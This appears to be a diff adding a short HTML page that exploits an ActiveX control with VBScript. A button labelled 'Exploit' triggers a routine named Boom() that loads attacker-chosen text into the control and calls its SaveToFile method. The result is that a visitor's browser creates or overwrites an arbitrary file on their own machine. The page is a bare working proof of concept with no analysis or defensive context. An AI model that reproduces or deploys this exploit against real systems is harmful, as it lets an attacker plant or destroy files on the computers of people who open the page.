@@ -1,0 +1,17 @@
+&lt;html&gt;
+&lt;object classid=&#039;clsid:979AE8AA-C206-40EC-ACA7-EC6B6BD7BE5E&#039; id=&#039;target&#039; /&gt;&lt;/object&gt;
+&lt;input language=VBScript onclick=Boom() type=button value=&quot;Exploit&quot;&gt;
+&lt;script language = &#039;vbscript&#039;&gt;
+
+Sub Boom()
+arg1=&quot;FilePath\File_name_to_rewrite_or_create&quot;
+arg2=1
+arg3=&quot;New_File_Content&quot;
+target.Text=arg3
+target.SelStart=0
+target.SelEnd=Len(arg3)
+target.SaveToFIle arg1,arg2
+End Sub
+
+&lt;/script&gt;
+&lt;/html&gt;
